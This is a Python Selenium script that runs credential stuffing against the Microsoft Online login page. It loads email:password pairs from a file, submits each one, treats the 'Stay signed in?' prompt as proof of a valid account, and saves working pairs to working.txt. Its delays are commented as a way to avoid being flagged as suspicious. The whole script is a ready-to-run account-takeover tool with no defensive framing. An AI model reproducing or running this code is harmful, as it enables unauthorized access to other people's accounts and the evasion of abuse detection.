from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager
import time

# File path for credentials
CREDENTIALS_FILE = 'users.txt'
WORKING_FILE = 'working.txt'
LOGIN_URL = "https://login.microsoftonline.com/"
CLOSE_BROWSER = True  # Close the browser after each attempt
WAIT_TIME = 1  # Waiting time in seconds

def read_credentials(file_path):
    credentials = {}
    with open(file_path, 'r', encoding='utf-8') as file:  # Specify UTF-8 encoding
        for line in file:
            line = line.strip()
            if line:
                try:
                    email, password = line.split(':', 1)  # Use ':' as delimiter
                    credentials[email] = password
                except ValueError:
                    print(f"Skipping invalid line: {line}")
    return credentials


def wait_for_element(driver, by, value, timeout=10):
    wait = WebDriverWait(driver, timeout)
    return wait.until(EC.presence_of_element_located((by, value)))

def wait_for_element_to_be_clickable(driver, by, value, timeout=10):
    wait = WebDriverWait(driver, timeout)
    return wait.until(EC.element_to_be_clickable((by, value)))

def find_element_by_value_or_type(driver, value, input_type, timeout=10):
    wait = WebDriverWait(driver, timeout)
    try:
        return wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, f"input[type='{input_type}'][value='{value}']")))
    except TimeoutException:
        return wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, f"input[type='{input_type}']")))

def login(email, password):
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

    try:
        driver.get(LOGIN_URL)
        print(f"Navigated to Microsoft Online login page for {email}")

        email_field = wait_for_element(driver, By.CSS_SELECTOR, "input[type='email']")
        print("Email field is present")
        email_field.send_keys(email)
        print("Entered email")

        next_button = wait_for_element_to_be_clickable(driver, By.CSS_SELECTOR, "input[type='submit']")
        next_button.click()
        print("Clicked next button")

        password_field = wait_for_element(driver, By.CSS_SELECTOR, "input[type='password']", timeout=20)
        print("Password field is present")
        password_field.send_keys(password)
        print("Entered password")

        sign_in_button = find_element_by_value_or_type(driver, "Sign in", "submit")
        sign_in_button.click()
        print("Clicked sign-in button")

        WebDriverWait(driver, 20).until(EC.url_contains("microsoftonline.com"))
        print(f"Login process completed for {email}")

        try:
            stay_signed_in_prompt = wait_for_element(driver, By.XPATH, "//div[contains(text(), 'Stay signed in?')]", timeout=10)
            if stay_signed_in_prompt:
                print("Stay signed in? prompt found. Waiting for 2 seconds and writing to file.")
                time.sleep(WAIT_TIME)
                with open(WORKING_FILE, 'a') as file:
                    file.write(f"{email},{password}\n")
                print("Credentials written to working.txt")
                return True  # Indicate that the login was successful and the credentials were written
        except TimeoutException:
            print("Stay signed in? prompt not found. Proceeding.")

        try:
            error_message = wait_for_element(driver, By.XPATH, "//div[contains(text(), 'Your account or password is incorrect. If you don't remember your password, ')]", timeout=5)
            if error_message:
                print("Error message found. Skipping credentials and waiting.")
                time.sleep(WAIT_TIME)
                return False  # Indicate that the login failed and credentials were not written
        except TimeoutException:
            print("Error message not found. Proceeding.")

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        print("Next page loaded")
        return True  # Indicate that the login was successful and no retry is needed

    except (WebDriverException, Exception) as e:
        print(f"An unexpected error occurred: {e}. Skipping credentials and waiting.")
        time.sleep(WAIT_TIME)
        return False  # Indicate that the login failed due to an unexpected error

    finally:
        if CLOSE_BROWSER:
            driver.quit()
            print("Browser closed")

# Read credentials from file
credentials = read_credentials(CREDENTIALS_FILE)

if not credentials:
    print("No credentials found in the file.")
else:
    print(f"Credentials read: {len(credentials)}")

# Iterate through the credentials dictionary and perform login for each pair
total_attempts = len(credentials)
for index, (email, password) in enumerate(credentials.items(), start=1):
    print(f"#{index}/{total_attempts} Attempting login for {email}")
    success = login(email, password)
    if not success:
        print(f"Login failed for {email}, retrying with the next credentials.")
        continue
    print(f"Login successful for {email}")
    time.sleep(WAIT_TIME)  # Optional: Add a delay between logins to avoid being flagged as suspicious

print("All credential processing is complete.")
